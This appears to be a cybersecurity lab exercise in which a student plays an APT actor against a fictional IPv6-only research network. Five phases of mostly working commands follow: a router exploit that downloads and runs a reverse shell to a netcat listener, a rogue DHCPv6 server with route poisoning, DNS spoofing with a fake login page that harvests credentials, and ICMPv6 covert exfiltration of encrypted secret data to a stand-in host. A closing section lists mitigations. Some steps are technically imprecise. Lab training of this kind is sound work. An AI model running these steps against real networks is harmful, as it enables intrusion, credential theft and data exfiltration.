# Operation Shadow Protocol

Objective: Act as an APT actor (`APT-66`, "Shadow6") to exploit a pure IPv6 research network. You will chain together reconnaissance, rogue services, and protocol manipulation to establish a persistent foothold, bypass native IPv6 security controls, and exfiltrate data via a covert channel.

Scenario: The [MycoSec](entity.md) "Singularity" lab is a cutting-edge, IPv6-only network segment used for protocol research. It has no IPv4 connectivity. Your goal is to exploit the inherent trust in IPv6 autoconfiguration and services to own the network.

## Phase 1: Reconnaissance - Mapping the IPv6-Only Terrain

Goal: Discover the IPv6 addressing scheme, identify critical infrastructure, and find the first exploitable target.

Instructions:

1.  Access Your Foothold:
    *   You have gained a limited shell on a Ubuntu 22.04 VM (`node-07`) via a compromised SSH key found in a public code repository.
    *   Command: `ssh -i id_ed25519_researcher researcher@node-07.myco6sec-lab.internal`
    *   Note: The hostname must be resolved via IPv6 DNS.

2.  Confirm IPv6-Only Environment:
    *   Verify there are no IPv4 addresses or routes on the system.
    *   Command: `ip -4 addr show` and `ip -4 route show`
    *   Expected Result: No IPv4 addresses or routes should be present.
    *   Command: `ip -6 addr show` and `ip -6 route show`
    *   Finding: Note your global IPv6 address and the default gateway. The gateway is your primary target. `ROUTER_LL` = `[DISCOVER THIS]`

3.  Passive Host Discovery:
    *   Use `passive_discovery6` to silently listen for traffic and map hosts, avoiding noisy scans.
    *   Command: `sudo passive_discovery6 eth0`
    *   Finding: Let this run for 5 minutes. Document the IPv6 addresses and hostnames of at least three other systems. Identify a target server: `TARGET_SERVER` = `[DISCOVER THIS]`

4.  Service Discovery on Critical Infrastructure:
    *   Perform a targeted scan on the router's link-local address (`ROUTER_LL`) to find management interfaces.
    *   Command: `nmap -6 -sT -p 22,80,443,8080 %eth0` (Replace `%eth0` with the correct zone identifier for your OS, e.g., `-e eth0` on Linux).
    *   Finding: What port is open on the router for a web management interface? `ROUTER_WEB_PORT` = `[DISCOVER THIS]`

Checkpoint: You have mapped the IPv6 network and identified a critical target: the router's web interface.

## Phase 2: Initial Foothold - Exploiting the Router API

Goal: Gain privileged access to the network router by exploiting a vulnerability in its IPv6 web management interface.

Instructions:

1.  Fingerprint the Web Service:
    *   Interact with the router's web interface to determine its make and model.
    *   Command: `curl -g -6 "http://[ROUTER_LL%eth0]:ROUTER_WEB_PORT/api/v1/system/version"`
    *   Finding: The curl command returns a JSON object. What is the router's model and software version? `ROUTER_VERSION` = `[DISCOVER THIS]`

2.  Research and Execute the Exploit:
    *   Your instructor has provided a proof-of-concept exploit for this specific router version. It exploits a command injection vulnerability in the SNMP configuration API.
    *   Command: `python3 cve-2024-xxxx_poc.py --rhost ROUTER_LL --rport ROUTER_WEB_PORT --lhost YOUR_IPV6 --lport 4444 --interface eth0`
    *   Success: This script should inject a command that downloads and executes a reverse shell payload back to your attacker VM.

3.  Establish a Reverse Shell:
    *   On your attacker VM, start a netcat listener on an IPv6 socket.
    *   Command: `sudo nc -6 -l -v -p 4444`
    *   Verification: You should receive a reverse shell connection from the router with root privileges.

Checkpoint: You have compromised the core network router, the most critical device on the segment.

## Phase 3: Persistence - Rogue DHCPv6 & RDNSS Poisoning

Goal: Become the authoritative source of truth for network configuration for all hosts, ensuring persistence even if the router is rebooted or reset.

Instructions:

1.  Install a Rogue DHCPv6 Server:
    *   On your attacker VM, install and configure the `wide-dhcpv6-server` package.
    *   Edit `/etc/wide-dhcpv6/dhcp6s.conf` to advertise your attacker VM as the default gateway and DNS server.
    
```text
option domain-name-servers YOUR_IPV6_GLOBAL;
interface eth0 {
    address-pool pool1 3600;
};
pool pool1 {
    range YOUR_SUBNET::1000 to YOUR_SUBNET::2000;
    allow unicast;
};
```

2.  Launch the Rogue Server:
    *   Start the DHCPv6 server to respond to client solicitations.
    *   Command: `sudo systemctl start wide-dhcpv6-server`

3.  Poison the Router's RA Messages:
    *   From your root shell on the compromised router, inject a malicious Route Advertisement (RA) that points to your attacker VM as a more preferred default router (lower priority).
    *   Router Command: `sudo ip -6 route add default via YOUR_IPV6_LINK_LOCAL dev eth0 metric 50`

4.  Trigger a Network Reconfiguration:
    *   Force a client to renew its DHCP lease and process new RAs.
    *   Command on a Target (simulated by instructor): `sudo dhclient -6 -r eth0 && sudo dhclient -6 -v eth0`
    *   Verification: Check the target's new IPv6 routing table and DNS resolver configuration. It should list your attacker VM's IP for both.

Checkpoint: You now control the network's configuration distribution system.

## Phase 4: Lateral Movement - Exploiting Trust Relationships

Goal: Use your control of DNS and the router to move laterally to the `TARGET_SERVER`.

Instructions:

1.  DNS Spoofing for Service Exploitation:
    *   The `TARGET_SERVER` uses a centralized authentication service. Poison the DNS record for `auth.myco6sec-lab.internal` to point to a malicious server you control.
    *   Command on your attacker VM (running dnschef): `sudo dnschef --ipv6 --fakeipv6=YOUR_IPV6 --interface=::0 --port=53`

2.  Set Up a Credential Harvesting Service:
    *   On your attacker VM, set up a simple HTTP server that mimics the login page of the authentication service and logs all POST requests.
    *   Command: `sudo python3 -m http.server 80`

3.  Intercept and Replay Credentials:
    *   Wait for authentication attempts from the `TARGET_SERVER` to be redirected to your fake login page. The credentials will be logged.
    *   Finding: Use the captured credentials to SSH into the `TARGET_SERVER`.
    *   Command: `ssh -o HostKeyAlgorithms=+ssh-rsa administrator@TARGET_SERVER` (The server uses a legacy key algorithm).

Checkpoint: You have laterally moved to the primary target server using hijacked credentials.

## Phase 5: Exfiltration - The IPv6 Covert Channel

Goal: Exfiltrate the target data (`/opt/secret/research_data.tar.gpg`) without triggering any data loss prevention (DLP) alerts.

Instructions:

1.  Encrypt and Fragment the Data:
    *   On the `TARGET_SERVER`, encrypt and split the data into small chunks to blend with normal traffic.
    *   Command: `tar czf - /opt/secret/ | openssl enc -e -aes-256-cbc -k "MyC0Pr0j3ct!" | split -b 1024 - research_data.`

2.  Encode Data into ICMPv6 Echo Requests:
    *   Use a custom tool (`icmp6_exfil`) to encode each data fragment into the payload of ICMPv6 Echo Request packets. These packets will be sent to a dead IPv6 address you control, but intercepted by your attacker VM due to your MITM position.
    *   Command: `for f in research_data.*; do ./icmp6_exfil -d 2001:db8:dead:beef::1 -f $f; done`

3.  Reassemble the Data:
    *   On your attacker VM, run `icmp6_sniff` to capture the ICMPv6 Echo Request packets, extract the payloads, and reassemble the original file.
    *   Command: `sudo ./icmp6_sniff -i eth0 -o exfiltrated_data.enc -d`

4.  Decrypt the Data:
    *   Decrypt the reassembled archive on your attacker VM.
    *   Command: `openssl enc -d -aes-256-cbc -k "MyC0Pr0j3ct!" -in exfiltrated_data.enc | tar xzf -`

Final Report: Document all the `[DISCOVER THIS]` fields. Explain the critical failure points in the lab's design:
1.  Exposed Management Interface: The router's API was exposed and vulnerable.
2.  Lack of RA Guard: The switch lacked IPv6 RA Guard, allowing malicious RAs.
3.  Absence of DHCPv6 Snooping: The switch did not validate DHCPv6 messages, allowing a rogue server.
4.  Weak Authentication: The critical server relied on a single factor and a legacy SSH algorithm.

Propose two advanced mitigations beyond the basics:
1.  Network-Level: Implement IPv6 Segmentation Firewalling to strictly control east-west traffic between subnets, preventing lateral movement from the research VLAN to the infrastructure VLAN.
2.  Host-Level: Deploy Endpoint Detection and Response (EDR) with behavioral analysis on all critical servers to detect anomalous process execution and data access patterns, like the mass encryption and splitting of files.

